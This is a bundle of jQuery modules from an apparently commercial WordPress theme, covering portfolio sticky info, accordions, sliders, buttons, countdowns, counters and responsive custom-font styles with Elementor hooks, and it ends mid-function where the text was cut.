(function($) {
    'use strict';

    var portfolio = {};
    mkdf.modules.portfolio = portfolio;

    portfolio.mkdfOnWindowLoad = mkdfOnWindowLoad;

    $(window).on('load', mkdfOnWindowLoad);

	/*
	 All functions to be called on $(window).load() should be in this function
	 */
	function mkdfOnWindowLoad() {
		mkdfPortfolioSingleFollow().init();
	}

	var mkdfPortfolioSingleFollow = function () {
		var info = $('.mkdf-follow-portfolio-info .mkdf-portfolio-single-holder .mkdf-ps-info-sticky-holder');

		if (info.length) {

			var ofsetTop = 0;
			var ofsetBottom = 0;
			var smallImages = $(".mkdf-ps-small-images-layout");
			var smallMasonry = $(".mkdf-ps-small-masonry-layout");


			if(smallImages.length || smallMasonry.length){
				ofsetTop = 30;
			}

            if(smallImages.length){
				ofsetBottom = 30;
			}

			var infoHolder = info.parent(),
				infoHolderOffset = infoHolder.offset().top - ofsetTop,
				infoHolderHeight = infoHolder.height() + ofsetTop - ofsetBottom,
				mediaHolder = $('.mkdf-ps-image-holder'),
				mediaHolderHeight = mediaHolder.height(),
				header = $('.header-appear, .mkdf-fixed-wrapper'),
				headerHeight = (header.length) ? header.height() : 0,
				constant = 56; //30 to prevent mispositioned
		}

		var infoHolderPosition = function () {
			if (info.length && mediaHolderHeight >= infoHolderHeight) {
				if (mkdf.scroll >= infoHolderOffset - headerHeight - mkdfGlobalVars.vars.mkdfAddForAdminBar - constant) {
					var marginTop = mkdf.scroll - infoHolderOffset + mkdfGlobalVars.vars.mkdfAddForAdminBar + headerHeight + constant;
					// if scroll is initially positioned below mediaHolderHeight
					if (marginTop + infoHolderHeight > mediaHolderHeight) {
						marginTop = mediaHolderHeight - infoHolderHeight + constant - ofsetTop;
					}
					info.stop().animate({
						marginTop: marginTop
					});
				}
			}
		};

		var recalculateInfoHolderPosition = function () {
			if (info.length && mediaHolderHeight >= infoHolderHeight) {
				//Calculate header height if header appears
				if (mkdf.scroll > 0 && header.length) {
					headerHeight = header.height();
				}

				var headerMixin = headerHeight + mkdfGlobalVars.vars.mkdfAddForAdminBar + constant;
				if (mkdf.scroll >= infoHolderOffset - headerMixin) {
					if (mkdf.scroll + infoHolderHeight + headerMixin + 2 * constant < infoHolderOffset + mediaHolderHeight) {
						info.stop().animate({
							marginTop: (mkdf.scroll - infoHolderOffset + headerMixin + ofsetTop)
						});
						//Reset header height
						headerHeight = 0;
					} else {
						info.stop().animate({
							marginTop: mediaHolderHeight - infoHolderHeight
						});
					}
				} else {
					info.stop().animate({
						marginTop: 0
					});
				}
			}
		};
		
		return {
			init: function () {
				infoHolderPosition();
				$(window).scroll(function () {
					recalculateInfoHolderPosition();
				});
			}
		};
	};

})(jQuery);
(function($) {
    'use strict';
	
	var accordions = {};
	mkdf.modules.accordions = accordions;
	
	accordions.mkdfInitAccordions = mkdfInitAccordions;
	
	
	accordions.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitAccordions();
	}

    /**
	All functions to be called on $(window).load() should be in this function
	*/

    function mkdfOnWindowLoad() {
        mkdfElementorAccordions();
    }

    /**
     * Elementor
     */
    function mkdfElementorAccordions(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_accordion.default', function() {
                mkdfInitAccordions();
            } );
        });
    }

	/**
	 * Init accordions shortcode
	 */
	function mkdfInitAccordions(){
		var accordion = $('.mkdf-accordion-holder');
		
		if(accordion.length){
			accordion.each(function(){
				var thisAccordion = $(this);

				if(thisAccordion.hasClass('mkdf-accordion')){
					thisAccordion.accordion({
						animate: "swing",
						collapsible: true,
						active: 0,
						icons: "",
						heightStyle: "content"
					});
				}

				if(thisAccordion.hasClass('mkdf-toggle')){
					var toggleAccordion = $(this),
						toggleAccordionTitle = toggleAccordion.find('.mkdf-accordion-title'),
						toggleAccordionContent = toggleAccordionTitle.next();

					toggleAccordion.addClass("accordion ui-accordion ui-accordion-icons ui-widget ui-helper-reset");
					toggleAccordionTitle.addClass("ui-accordion-header ui-state-default ui-corner-top ui-corner-bottom");
					toggleAccordionContent.addClass("ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom").hide();

					toggleAccordionTitle.each(function(){
						var thisTitle = $(this);
						
						thisTitle.on('mouseenter mouseleave', function(){
							thisTitle.toggleClass("ui-state-hover");
						});

						thisTitle.on('click',function(){
							thisTitle.toggleClass('ui-accordion-header-active ui-state-active ui-state-default ui-corner-bottom');
							thisTitle.next().toggleClass('ui-accordion-content-active').slideToggle(400);
						});
					});
				}
			});
		}
	}

})(jQuery);
(function($) {
    'use strict';

    var animatedSwitchSlider = {};
    mkdf.modules.animatedSwitchSlider = animatedSwitchSlider;

    animatedSwitchSlider.mkdfAnimatedSwitchSlider = mkdfAnimatedSwitchSlider;
    animatedSwitchSlider.mkdfOnWindowLoad = mkdfOnWindowLoad;

    $(window).on('load', mkdfOnWindowLoad());

    /**
     All functions to be called on $(window).load() should be in this function
     */
    function mkdfOnWindowLoad() {
        mkdfAnimatedSwitchSlider();
        mkdfElementorAnimatedSwitchSlider();
    }


    /**
     * Elementor
     */
    function mkdfElementorAnimatedSwitchSlider(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_animated_switch_slider.default', function() {
                mkdfAnimatedSwitchSlider();
            } );
        });
    }
    /**
     * Init animated switch slider shortcode
     */
    function mkdfAnimatedSwitchSlider() {
        var slider = $('#mkdf-animated-switch-slider');

        if (slider.length) {
            var slides = slider.find('.mkdf-switch-slide'),
                bgTexts = slider.find('.mkdf-item-background-text'),
                overlay = slider.find('.mkdf-item-text-left'),
                bgrndImages = slider.find('.mkdf-background-images-holder'),
                paginationHolder = slider.find('.mkdf-animated-switch-slider-pagination'),
                paginationBullet = paginationHolder.find('.mkdf-animated-ss-button'),
                initialized = false;

            var fullscreenCalcs = function() {
                var heightVal = mkdf.windowHeight - slider.offset().top;

                if (mkdf.body.hasClass('mkdf-paspartu-enabled')) {
                    var passepartoutSize = parseInt($('.mkdf-wrapper').css('padding-top'));

                    heightVal -= passepartoutSize;
                }

                slider.css('height', heightVal);
            }

            var prepItems = function() {
                slides.first().addClass('mkdf-active');
                changeImage();
                headerSkin();
            }

            //slideshow logic start
            var startAnimating = function() {
                slider.addClass('mkdf-animating');
                bgTexts.each(function(){
                    $(this).fadeOut();
                })
            }

            var endAnimating = function() {
                slides.filter('.mkdf-active').one(mkdf.animationEnd,function(){
                    var activeSlide = $(this);
                    slider.removeClass('mkdf-animating');
                    bgTexts.each(function(){
                        if($(this).data('index') === activeSlide.data('index')){
                            $(this).fadeIn();
                        }
                    })
                    paginationBullet.removeClass('mkdf-active');
                    paginationBullet.eq(activeSlide.data('index') - 1).addClass('mkdf-active');
                });
            }

            var changeImage = function() {
                bgrndImages.css('z-index', 'auto');
                slides.filter('.mkdf-active').find(bgrndImages).css('z-index', 10);
            }

            var headerSkin = function() {
                if(slider.hasClass('mkdf-enabled-header-skin-change')) {
                    mkdf.body.removeClass('mkdf-light-header mkdf-dark-header');

                    if (slides.filter('.mkdf-active').hasClass('mkdf-light-header')) {
                        mkdf.body.addClass('mkdf-light-header');
                    } else if(slides.filter('.mkdf-active').hasClass('mkdf-dark-header')){
                        mkdf.body.addClass('mkdf-dark-header');
                    }
                }
            }

            var paginationSkin = function() {
                paginationHolder.removeClass('mkdf-light-slin mkdf-dark-skin');

                if (slides.filter('.mkdf-active').find('.mkdf-item-overlay').hasClass('mkdf-dark')) {
                    paginationHolder.addClass('mkdf-dark-skin');
                } else {
                    paginationHolder.addClass('mkdf-light-skin');
                }
            }

            var nextSlide = function() {
                startAnimating();

                if (slides.filter('.mkdf-active').next().index() > 0) {
                    slides.removeClass('mkdf-remove');
                    slides.filter('.mkdf-active')
                        .removeClass('mkdf-active')
                        .addClass('mkdf-remove').next()
                        .addClass('mkdf-active');
                } else {
                    slides.removeClass('mkdf-active mkdf-remove');
                    slides.first().addClass('mkdf-active');
                    slides.last().addClass('mkdf-remove');
                }

                setTimeout( function(){
                    changeImage();
                }, 400);

                headerSkin();
                paginationSkin();
                endAnimating();

                /*overlay.one(mkdf.animationEnd, function(){
                    changeImage();
                    headerSkin();
                    endAnimating();
                });*/
            }

            var prevSlide = function() {
                startAnimating();

                if (slides.filter('.mkdf-active').prev().index() < 0) {
                    slides.removeClass('mkdf-active mkdf-remove');
                    slides.first().addClass('mkdf-remove');
                    slides.last().addClass('mkdf-active');
                } else {
                    slides.removeClass('mkdf-remove');
                    slides.filter('.mkdf-active')
                        .removeClass('mkdf-active')
                        .addClass('mkdf-remove').prev()
                        .addClass('mkdf-active');
                }

                setTimeout( function(){
                    changeImage();
                }, 400);

                headerSkin();
                paginationSkin();
                endAnimating();

                /*overlay.one(mkdf.animationEnd, function(){
                    changeImage();
                    headerSkin();
                    endAnimating();
                });*/
            }

            var goToSlide = function(index){
                startAnimating();

                slides.each(function(){
                    $(this).removeClass('mkdf-remove');
                })
                slides.filter('.mkdf-active').removeClass('mkdf-active').addClass('mkdf-remove');
                slides.eq(index - 1).addClass('mkdf-active');

                setTimeout( function(){
                    changeImage();
                }, 400);

                headerSkin();
                paginationSkin();
                endAnimating();

            }

            var slideshowScroll = function() {
                if (!mkdf.htmlEl.hasClass('touch')) {
                    var delta = 0;

                    slider.mousewheel(function(e) {
                        e.preventDefault();

                        if (!initialized) {
                            initialized = true;
                        }

                        if (!slider.hasClass('mkdf-animating')) {
                            if (e.deltaY < 0) {
                                delta = -1;
                            } else {
                                delta = 1;
                            }

                            if (delta == -1 ) {
                                nextSlide();

                            } else {
                                prevSlide();
                            }
                        }
                    });

                    slider.on('wheel', function() { return false; });
                }
            }

            var touchSlider = function() {
                if (mkdf.htmlEl.hasClass('touch')) {
                    var ts;

                    slider.on('touchstart', function (e){
                        if (!slider.hasClass('mkdf-animating')) {
                           ts = e.originalEvent.touches[0].clientY;
                        }
                    });

                    slider.on('touchend', function (e){
                        if (!slider.hasClass('mkdf-animating')) {
                            var te = e.originalEvent.changedTouches[0].clientY;

                            if (ts > te+5) {
                                prevSlide();
                            } else if (ts < te-5) {
                                nextSlide();
                            }
                        }
                    });
                }
            }

            var slideShowClick = function(){
                if(paginationBullet.length){
                    paginationBullet.each(function(){
                        var thisBullet = $(this);
                        thisBullet.on('click', function(){
                            goToSlide(thisBullet.data('index'));
                        })
                    })
                }
            }
            //slideshow logic end

            //init
            slider.waitForImages(function(){
                fullscreenCalcs();
                prepItems();
                slideshowScroll();
                touchSlider();
                endAnimating();
                slideShowClick();
            });

            $(window).resize(function(){
                fullscreenCalcs();
            });
        }
    }

})(jQuery);

(function($) {
	'use strict';
	
	var animationHolder = {};
	mkdf.modules.animationHolder = animationHolder;
	
	animationHolder.mkdfInitAnimationHolder = mkdfInitAnimationHolder;
	
	
	animationHolder.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	
	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitAnimationHolder();
	}
	
	/*
	 *	Init animation holder shortcode
	 */
	function mkdfInitAnimationHolder(){
		var elements = $('.mkdf-grow-in, .mkdf-fade-in-down, .mkdf-element-from-fade, .mkdf-element-from-left, .mkdf-element-from-right, .mkdf-element-from-top, .mkdf-element-from-bottom, .mkdf-flip-in, .mkdf-x-rotate, .mkdf-z-rotate, .mkdf-y-translate, .mkdf-fade-in, .mkdf-fade-in-left-x-rotate'),
			animationClass,
			animationData,
			animationDelay;
		
		if(elements.length){
			elements.each(function(){
				var thisElement = $(this);
				
				thisElement.appear(function() {
					animationData = thisElement.data('animation');
					animationDelay = parseInt(thisElement.data('animation-delay'));
					
					if(typeof animationData !== 'undefined' && animationData !== '') {
						animationClass = animationData;
						var newClass = animationClass+'-on';
						
						setTimeout(function(){
							thisElement.addClass(newClass);
						},animationDelay);
					}
				},{accX: 0, accY: mkdfGlobalVars.vars.mkdfElementAppearAmount});
			});
		}
	}
	
})(jQuery);
(function ($) {
    'use strict';

    var button = {};
    mkdf.modules.button = button;


    button.mkdfOnDocumentReady = mkdfOnDocumentReady;

    $(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
    function mkdfOnDocumentReady() {
        mkdfButton().init();
    }

    /*
    All functions to be called on $(window).load() should be in this function
    */
    function mkdfOnWindowLoad() {
        mkdfElementorButton();
    }

    /**
     * Elementor
     */
    function mkdfElementorButton(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_button.default', function() {
                mkdfButton().init();
            } );
        });
    }

    /**
     * Button object that initializes whole button functionality
     * @type {Function}
     */
    var mkdfButton = function () {
        //all buttons on the page
        var buttons = $('.mkdf-btn');

        /**
         * Initializes button hover color
         * @param button current button
         */
        var buttonHoverColor = function (button) {
            if (typeof button.data('hover-color') !== 'undefined') {
                var changeButtonColor = function (event) {
                    event.data.button.css('color', event.data.color);
                };

                var originalColor = button.css('color');
                var hoverColor = button.data('hover-color');

                button.on('mouseenter', { button: button, color: hoverColor }, changeButtonColor);
                button.on('mouseleave', { button: button, color: originalColor }, changeButtonColor);
            }
        };

        /**
         * Initializes button hover background color
         * @param button current button
         */
        var buttonHoverBgColor = function (button) {
            if (typeof button.data('hover-bg-color') !== 'undefined') {
                var changeButtonBg = function (event) {
                    event.data.button.css('background-color', event.data.color);
                };

                var originalBgColor = button.css('background-color');
                var hoverBgColor = button.data('hover-bg-color');

                button.on('mouseenter', { button: button, color: hoverBgColor }, changeButtonBg);
                button.on('mouseleave', { button: button, color: originalBgColor }, changeButtonBg);
            }
        };

        /**
         * Initializes button border color
         * @param button
         */
        var buttonHoverBorderColor = function (button) {
            if (typeof button.data('hover-border-color') !== 'undefined') {
                var changeBorderColor = function (event) {
                    event.data.button.css('border-color', event.data.color);
                };

                var originalBorderColor = button.css('borderTopColor'); //take one of the four sides
                var hoverBorderColor = button.data('hover-border-color');

                button.on('mouseenter', { button: button, color: hoverBorderColor }, changeBorderColor);
                button.on('mouseleave', { button: button, color: originalBorderColor }, changeBorderColor);
            }
        };

        /**
         * Initializes button hover box-shadow
         * @param button current button
         */
        var buttonHoverShadow = function (button) {
            var setButtonShadow = function (event) {
                event.data.button.css('box-shadow', '0px 10px 20px 0px rgba(' + event.data.color + ')');
            }

            var resetButtonShadow = function (event) {
                event.data.button.css('box-shadow', 'none');
            }

            var rgba = button.css('background-color').match(/[.?\d]+/g);

            rgba.length == 3 && rgba.push('0.5');

            button
                .on('mouseenter', { button: button, color: rgba.toString() }, setButtonShadow)
                .on('mouseleave', { button: button }, resetButtonShadow);
        };

        return {
            init: function () {
                if (buttons.length) {
                    buttons.not('.mkdf-btn-solid').each(function () {
                        buttonHoverColor($(this));
                        buttonHoverBgColor($(this));
                        buttonHoverBorderColor($(this));
                    });
                    buttons.filter('.mkdf-btn-solid').each(function () {
                        buttonHoverColor($(this));
                        buttonHoverBorderColor($(this));
                        buttonHoverShadow($(this));
                    });
                }
            }
        };
    };
    button.mkdfButton = mkdfButton;


})(jQuery);
(function ($) {
    'use strict';

    $(document).ready(mkdfOnDocumentReady);
    $(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
    function mkdfOnDocumentReady() {
    }

    /*
    All functions to be called on $(window).load() should be in this function
    */
    function mkdfOnWindowLoad() {
        mkdfElementorCallToAction();
    }

    /**
     * Elementor
     */
    function mkdfElementorCallToAction(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_call_to_action.default', function() {
                mkdf.modules.button.mkdfButton().init();
            } );
        });
    }

})(jQuery);
(function ($) {
	'use strict';
	
	var cardsGallery = {};
	mkdf.modules.cardsGallery = cardsGallery;
	
	
	cardsGallery.mkdfOnWindowLoad = mkdfOnWindowLoad;
	
	$(window).on('load', mkdfOnWindowLoad());
	
	/*
	 All functions to be called on $(window).load() should be in this function
	 */
	function mkdfOnWindowLoad() {
		mkdfInitCardsGallery();
        mkdfElementorCardsGallery();
	}
	
	/*
	 **	Init cards gallery shortcode
	 */
	function mkdfInitCardsGallery() {
		var holder = $('.mkdf-cards-gallery');
		
		if (holder.length) {
			holder.each(function () {
				var thisHolder = $(this),
					cards = thisHolder.find('.mkdf-cg-card');
				
				cards.each(function () {
					var card = $(this);
					
					card.on('click', function () {
						if (!cards.last().is(card)) {
							card.addClass('mkdf-out mkdf-animating').siblings().addClass('mkdf-animating-siblings');
							card.detach();
							card.insertAfter(cards.last());
							
							setTimeout(function () {
								card.removeClass('mkdf-out');
							}, 200);
							
							setTimeout(function () {
								card.removeClass('mkdf-animating').siblings().removeClass('mkdf-animating-siblings');
							}, 1200);
							
							cards = thisHolder.find('.mkdf-cg-card');
							
							return false;
						}
					});
				});
				
				if (thisHolder.hasClass('mkdf-bundle-animation') && !mkdf.htmlEl.hasClass('touch')) {
					thisHolder.appear(function () {
						thisHolder.addClass('mkdf-appeared');
						thisHolder.find('img').one('animationend webkitAnimationEnd MSAnimationEnd oAnimationEnd', function () {
							$(this).addClass('mkdf-animation-done');
						});
					}, {accX: 0, accY: mkdfGlobalVars.vars.mkdfElementAppearAmount});
				}
			});
		}
	}

    /**
     * Elementor
     */
    function mkdfElementorCardsGallery(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_cards_gallery.default', function() {
                mkdfInitCardsGallery();
            } );
        });
    }
	
})(jQuery);
(function ($) {
	'use strict';
	
	var clientsCarousel = {};
	mkdf.modules.clientsCarousel = clientsCarousel;


	clientsCarousel.mkdfOnWindowLoad = mkdfOnWindowLoad;
	
	$(window).on('load', mkdfOnWindowLoad());
	
	/**
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnWindowLoad() {
		mkdfElementorClientsCarousel();
	}

    /**
     * Elementor
     */
	function mkdfElementorClientsCarousel() {
		$(window).on('elementor/frontend/init', function () {
			elementorFrontend.hooks.addAction('frontend/element_ready/mkdf_clients_carousel.default', function () {
				mkdf.modules.common.mkdfOwlSlider();
			});
		});
	}
	
})(jQuery);
(function($) {
	'use strict';
	
	var countdown = {};
	mkdf.modules.countdown = countdown;
	
	countdown.mkdfInitCountdown = mkdfInitCountdown;
	
	
	countdown.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitCountdown();
	}

    /*
	All functions to be called on $(window).load() should be in this function
	*/

    function mkdfOnWindowLoad() {
        mkdfElementorCountdown();
    }

    /**
     * Elementor
     */
    function mkdfElementorCountdown(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_countdown.default', function() {
                mkdfInitCountdown();
            } );
        });
    }

	/**
	 * Countdown Shortcode
	 */
	function mkdfInitCountdown() {
		var countdowns = $('.mkdf-countdown'),
			date = new Date(),
			currentMonth = date.getMonth(),
			currentYear = date.getFullYear(),
			year,
			month,
			day,
			hour,
			minute,
			timezone,
			monthLabel,
			dayLabel,
			hourLabel,
			minuteLabel,
			secondLabel;
		
		if (countdowns.length) {
			countdowns.each(function(){
				//Find countdown elements by id-s
				var countdownId = $(this).attr('id'),
					countdown = $('#'+countdownId),
					digitFontSize,
					digitFontSizeResponsive,
					labelFontSize,
					labelFontSizeResponsive;

				//Get data for countdown
				year = countdown.data('year');
				month = countdown.data('month');
				day = countdown.data('day');
				hour = countdown.data('hour');
				minute = countdown.data('minute');
				timezone = countdown.data('timezone');
				monthLabel = countdown.data('month-label');
				dayLabel = countdown.data('day-label');
				hourLabel = countdown.data('hour-label');
				minuteLabel = countdown.data('minute-label');
				secondLabel = countdown.data('second-label');
				digitFontSize = countdown.data('digit-size');
                digitFontSizeResponsive = countdown.data('digit-size-responsive');
				labelFontSize = countdown.data('label-size');
                labelFontSizeResponsive = countdown.data('label-size-responsive');

				if( currentMonth !== month || currentYear !== year ) {
					month = month - 1;
				}
				
				//Initialize countdown
				countdown.countdown({
					until: new Date(year, month, day, hour, minute, 44),
					labels: ['', monthLabel, '', dayLabel, hourLabel, minuteLabel, secondLabel],
					format: 'ODHMS',
					timezone: timezone,
					padZeroes: true,
					onTick: setCountdownStyle
				});

				function setCountdownStyle() {
					countdown.find('.countdown-amount').css({
						'font-size' : digitFontSize+'px',
						'line-height' : digitFontSize+'px'
					});
					countdown.find('.countdown-period').css({
						'font-size' : labelFontSize+'px'
					});

					if(mkdf.windowWidth <= 680){
                        countdown.find('.countdown-amount').css({
                            'font-size' : digitFontSizeResponsive+'px',
                            'line-height' : digitFontSizeResponsive+'px'
                        });
                        countdown.find('.countdown-period').css({
                            'font-size' : labelFontSizeResponsive+'px'
                        });
					}
				}
			});
		}
	}

	
})(jQuery);
(function($) {
	'use strict';
	
	var counter = {};
	mkdf.modules.counter = counter;
	
	counter.mkdfInitCounter = mkdfInitCounter;
	
	
	counter.mkdfOnDocumentReady = mkdfOnDocumentReady;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitCounter();
	}

	/*
	All functions to be called on $(window).load() should be in this function
	*/

    function mkdfOnWindowLoad() {
        mkdfElementorCounter();
    }

	/**
	 * Counter Shortcode
	 */
	function mkdfInitCounter() {
		var counterHolder = $('.mkdf-counter-holder');

		if (counterHolder.length) {
			counterHolder.each(function() {
				var thisCounterHolder = $(this),
					thisCounter = thisCounterHolder.find('.mkdf-counter');
				
				thisCounterHolder.appear(function() {
					thisCounterHolder.css('opacity', '1');

                    if(mkdf.windowWidth <= 1440){
                        thisCounter.css('font-size',thisCounterHolder.data('responsive-font-size'));
                    }
					//Counter zero type
					if (thisCounter.hasClass('mkdf-zero-counter')) {
						var max = parseFloat(thisCounter.text());
						thisCounter.countTo({
							from: 0,
							to: max,
							speed: 1500,
							refreshInterval: 100
						});
					} else {
						thisCounter.absoluteCounter({
							speed: 2000,
							fadeInDelay: 1000
						});
					}
				},{accX: 0, accY: mkdfGlobalVars.vars.mkdfElementAppearAmount});
			});
		}
	}

    /**
     * Elementor
     */
    function mkdfElementorCounter(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_counter.default', function() {
                mkdfInitCounter();
            } );
        });
    }

})(jQuery);
(function ($) {
	'use strict';
	
	var customFont = {};
	mkdf.modules.customFont = customFont;
	
	customFont.mkdfCustomFontResize = mkdfCustomFontResize;
	customFont.mkdfCustomFontTypeOut = mkdfCustomFontTypeOut;
	
	
	customFont.mkdfOnDocumentReady = mkdfOnDocumentReady;
	customFont.mkdfOnWindowLoad = mkdfOnWindowLoad;
	
	$(document).ready(mkdfOnDocumentReady);
	$(window).on('load', mkdfOnWindowLoad());
	
	/**
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfCustomFontResize();
	}
	
	/**
	 All functions to be called on $(window).load() should be in this function
	 */
	function mkdfOnWindowLoad() {
		mkdfCustomFontTypeOut();
        mkdfElementorCustomFont();
	}

    /**
     * Elementor
     */
    function mkdfElementorCustomFont(){
        $(window).on('elementor/frontend/init', function () {
            elementorFrontend.hooks.addAction( 'frontend/element_ready/mkdf_custom_font.default', function() {
                mkdfCustomFontResize();
                mkdfCustomFontTypeOut();
            } );
        });
    }

	/**
	 **	Custom Font resizing style
	 */
	function mkdfCustomFontResize() {
		var holder = $('.mkdf-custom-font-holder');
		
		if (holder.length) {
			holder.each(function () {
				var thisItem = $(this),
					itemClass = '',
					smallLaptopStyle = '',
					ipadLandscapeStyle = '',
					ipadPortraitStyle = '',
					mobileLandscapeStyle = '',
					style = '',
					responsiveStyle = '';
				
				if (typeof thisItem.data('item-class') !== 'undefined' && thisItem.data('item-class') !== false) {
					itemClass = thisItem.data('item-class');
				}
				
				if (typeof thisItem.data('font-size-1366') !== 'undefined' && thisItem.data('font-size-1366') !== false) {
					smallLaptopStyle += 'font-size: ' + thisItem.data('font-size-1366') + ' !important;';
				}
				if (typeof thisItem.data('font-size-1024') !== 'undefined' && thisItem.data('font-size-1024') !== false) {
					ipadLandscapeStyle += 'font-size: ' + thisItem.data('font-size-1024') + ' !important;';
				}
				if (typeof thisItem.data('font-size-768') !== 'undefined' && thisItem.data('font-size-768') !== false) {
					ipadPortraitStyle += 'font-size: ' + thisItem.data('font-size-768') + ' !important;';
				}
				if (typeof thisItem.data('font-size-680') !== 'undefined' && thisItem.data('font-size-680') !== false) {
					mobileLandscapeStyle += 'font-size: ' + thisItem.data('font-size-680') + ' !important;';
				}
				
				if (typeof thisItem.data('line-height-1366') !== 'undefined' && thisItem.data('line-height-1366') !== false) {
					smallLaptopStyle += 'line-height: ' + thisItem.data('line-height-1366') + ' !important;';
				}
				if (typeof thisItem.data('line-height-1024') !== 'undefined' && thisItem.data('line-height-1024') !== false) {
					ipadLandscapeStyle += 'line-height: ' + thisItem.data('line-height-1024') + ' !important;';
				}
				if (typeof thisItem.data('line-height-768') !== 'undefined' && thisItem.data('line-height-768') !== false) {
					ipadPortraitStyle += 'line-height: ' + thisItem.data('line-height-768') + ' !important;';
				}
				if (typeof thisItem.data('line-height-680') !== 'undefined' && thisItem.data('line-height-680') !== false) {
					mobileLandscapeStyle += 'line-height: ' + thisItem.data('line-height-680') + ' !important;';
				}
				
				if (smallLaptopStyle.length || ipadLandscapeStyle.length || ipadPortraitStyle.length || mobileLandscapeStyle.length) {
					
					if (smallLaptopStyle.length) {
						responsiveStyle += "@media only screen and (max-width: 1366px) {.mkdf-custom-font-holder." + itemClass + " { " + smallLaptopStyle + " } }";
					}
					if (ipadLandscapeStyle.length) {
						responsiveStyle += "@media only screen and (max-width: 1024px) {.mkdf-custom-font-holder." + itemClass + " { " + ipadLandscapeStyle + " } }";
					}
					if (ipadPortraitStyle.length) {
						responsiveStyle += "@media only screen and (max-width: 768px) {.mkdf-custom-font-holder." + itemClass + " { " + ipadPortraitStyle + " } }";
					}
					if (mobileLandscapeStyle.length) {
						responsiveStyle += "@media only screen and (max-width: 680px) {.mkdf-custom-font-holder." + itemClass + " { " + mobileLandscapeStyle + " } }";
					}
				}
				
				if (responsiveStyle.length) {
					style = '<style type="text/css">' + responsiveStyle + '</style>';
				}
				
				if (style.length) {
					$('head').append(style);
				}
			});
		}
	}
	
	/*
	 * Init Type out functionality for Custom Font shortcode
	 */
	function mkdfCustomFontTypeOut() {
		var mkdfTyped = $('.mkdf-cf-typed');
		
		if (mkdfTyped.length) {
			mkdfTyped.each(function () {

                //vars
                var thisTyped = $(this),
                    typedWrap = thisTyped.parent('.mkdf-cf-typed-wrap'),
                    customFontHolder = typedWrap.parent('.mkdf-custom-font-holder'),
                    str = [],
                    string_1 = thisTyped.find('.mkdf-cf-typed-1').text(),
                    string_2 = thisTyped.find('.mkdf-cf-typed-2').text(),
                    string_3 = thisTyped.find('.mkdf-cf-typed-3').text(),
                    string_4 = thisTyped.find('.mkdf-cf-typed-4').text();

                if (string_1.length) {
                    str.push(string_1);
                }

                if (string_2.length) {
                    str.push(string_2);
                }

                if (string_3.length) {
                    str.push(string_3);
                }

                if (string_4.length) {
                    str.push(string_4);
                }
               if(str.length > 0) {
					customFontHolder.appear(function () {
						thisTyped.typed({
							strings: str,
							typeSpeed: 90,
							backDelay: 700,
							loop: true,
							contentType: 'text',
							loopCount: false,
							cursorChar: '_'
						});
					}, {accX: 0, accY: mkdfGlobalVars.vars.mkdfElementAppearAmount});
            	}
			});
		}
	}


})(jQuery);
(function($) {
	'use strict';

	var elementsHolder = {};
	mkdf.modules.elementsHolder = elementsHolder;

	elementsHolder.mkdfInitElementsHolderResponsiveStyle = mkdfInitElementsHolderResponsiveStyle;


	elementsHolder.mkdfOnDocumentReady = mkdfOnDocumentReady;

	$(document).ready(mkdfOnDocumentReady);

	/*
	 All functions to be called on $(document).ready() should be in this function
	 */
	function mkdfOnDocumentReady() {
		mkdfInitElementsHolderResponsiveStyle();
	}

	/*
	 **	Elements Holder responsive style
	 */
	function mkdfInitElementsHolderResponsiveStyle(){
		var elementsHolder = $('.mkdf-elements-holder');

		if(elementsHolder.length){
			elementsHolder.each(function() {
				var thisElementsHolder = $(this),
					elementsHolderItem = thisElementsHolder.children('.mkdf-eh-item'),
					style = '',
					responsiveStyle = '';

				elementsHolderItem.each(function() {
					var thisItem = $(this),
						itemClass = '',
						largeLaptop = '',
						smallLaptop = '',
						ipadLandscape = '',
						ipadPortrait = '',
						mobileLandscape = '',
						mobilePortrait = '';

					if (typeof thisItem.data('item-class') !== 'undefined' && thisItem.data('item-class') !== false) {
						itemClass = thisItem.data('item-class');
					}
					if (typeof thisItem.data('1367-1600') !== 'undefined' && thisItem.data('1367-1600') !== false) {
						largeLaptop = thisItem.data('1367-1600');
					}
					if (typeof thisItem.data('1025-1366') !== 'undefined' && thisItem.data('1025-1366') !== false) {
						smallLaptop = thisItem.data('1025-1366');
					}
					if (typeof thisItem.data('769-1024') !== 'undefined' && thisItem.data('769-1024') !== false) {
						ipadLandscape = thisItem.data('769-1024');
					}
					if (typeof thisItem.data('681-768') !== 'undefined' && thisItem.data('681-768') !== false) {
						ipadPortrait = thisItem.data('681-768');
					}
					if (typeof thisItem.data('680') !== 'undefined' && thisItem.data('680') !== false) {
